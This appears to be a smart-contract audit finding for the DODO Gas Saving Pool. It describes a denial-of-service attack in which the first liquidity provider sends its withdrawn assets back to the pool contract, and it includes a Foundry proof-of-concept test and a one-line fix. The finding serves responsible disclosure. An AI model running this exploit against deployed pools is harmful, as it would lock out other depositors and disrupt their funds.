Real Honeysuckle Bobcat

medium

# First LP can DOS future LP stakers by withdrawing assets back to GSP contract

## Summary

The sellShares() function allows an LP to set the `to` address to GSP's own contract. This can cause accounting issues with the GSP contract leading to DOS.

## Vulnerability Detail

The vulnerability is caused by several reasons:

- LP can set the `to` param to the GSP contract
- LP can burn all but 1 LP shares.
- The _mint() function requires at least 1000 shares to be minted.

With this combo, the first LP of a pool can burn all but 1 share and then have the balance sent back to the GSP contract. This leads to a scenario where the LP owns 1 share. Any future LP tokens will have to mint at least 1,000 times the amount of assets stored in the pool. Otherwise, the mint operation will revert.

The forge test below will revert because the OTHER LP has not provided enough funds (they need to exceed at least 1,000+ times the original deposit amount set by the first LP in order to successfully mint:

```solidity
// forge test -vvv --fork-url FORGE_URL_HERE --match-test test_sellSharesReserveBurnAllExceptOneShareExploit
function test_sellSharesReserveBurnAllExceptOneShareExploit() public {
    console.log("GSP stats before attack:");
    console.log("--------------------------");
    console.log("BASE RESERVE: ", uint(gsp._BASE_RESERVE_()));
    console.log("QUOTE RESERVE: ", uint(gsp._QUOTE_RESERVE_()));
    console.log("TOTAL SUPPLY: ", uint(gsp.totalSupply()));

    // USER buys shares
    vm.startPrank(USER);
    dai.transfer(address(gsp), BASE_RESERVE);
    usdc.transfer(address(gsp), QUOTE_RESERVE);
    gsp.buyShares(USER);

    console.log("");
    console.log("");
    console.log("GSP stats after USER buys shares:");
    console.log("--------------------------");
    console.log("BASE RESERVE: ", uint(gsp._BASE_RESERVE_()));
    console.log("QUOTE RESERVE: ", uint(gsp._QUOTE_RESERVE_()));
    console.log("BASE GSP TOKEN BALANCE: ", uint(dai.balanceOf(address(gsp))));
    console.log("QUOTE GSP TOKEN BALANCE: ", uint(usdc.balanceOf(address(gsp))));
    console.log("TOTAL SUPPLY: ", uint(gsp.totalSupply()));


    // USER sells shares
    uint256 shares = gsp.balanceOf(USER);
    gsp.sellShares(shares - 1, address(gsp), 0, 0, "", block.timestamp);

    console.log("");
    console.log("");
    console.log("GSP stats after USER sells shares:");
    console.log("--------------------------");
    console.log("BASE RESERVE: ", uint(gsp._BASE_RESERVE_()));
    console.log("QUOTE RESERVE: ", uint(gsp._QUOTE_RESERVE_()));
    console.log("BASE GSP TOKEN BALANCE: ", uint(dai.balanceOf(address(gsp))));
    console.log("QUOTE GSP TOKEN BALANCE: ", uint(usdc.balanceOf(address(gsp))));
    console.log("TOTAL SUPPLY: ", uint(gsp.totalSupply()));


    // transfer some tokens to OTHER
    vm.startPrank(DAI_WHALE);
    dai.transfer(OTHER, BASE_RESERVE * 10_000);
    vm.stopPrank();
    vm.startPrank(USDC_WHALE);
    usdc.transfer(OTHER, QUOTE_RESERVE * 10_000);
    vm.stopPrank();

    // OTHER buys shares
    vm.startPrank(OTHER);
    dai.transfer(address(gsp), BASE_RESERVE * 1_000);
    usdc.transfer(address(gsp), QUOTE_RESERVE * 1_000);
    gsp.buyShares(OTHER);

    console.log("");
    console.log("");
    console.log("GSP stats after OTHER buys shares:");
    console.log("--------------------------");
    console.log("other owns ", gsp.balanceOf(OTHER), " total amount of shares");
    console.log("BASE RESERVE: ", uint(gsp._BASE_RESERVE_()));
    console.log("QUOTE RESERVE: ", uint(gsp._QUOTE_RESERVE_()));
    console.log("BASE GSP TOKEN BALANCE: ", uint(dai.balanceOf(address(gsp))));
    console.log("QUOTE GSP TOKEN BALANCE: ", uint(usdc.balanceOf(address(gsp))));
    console.log("TOTAL SUPPLY: ", uint(gsp.totalSupply()));
}
```

## Impact

LP minters will not be able to interact with the protocol unless a large whale deposits tokens into the pool.

## Code Snippet

https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/main/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol?plain=1#L92-L146

 
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/main/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol?plain=1#L294-L300


## Tool used

Manual Review
 

## Recommendation

Do not allow the `to` argument in the sellShares function to be set to the GSP contract. This will ensure that a LP can't nerf the contract.

```solidity
function sellShares(
    uint256 shareAmount,
    address to,
    uint256 baseMinAmount,
    uint256 quoteMinAmount,
    bytes calldata data,
    uint256 deadline
) external nonReentrant returns (uint256 baseAmount, uint256 quoteAmount) {
  require(to != address(this), "Sending tokens to this GSP contract is not allowed");
```
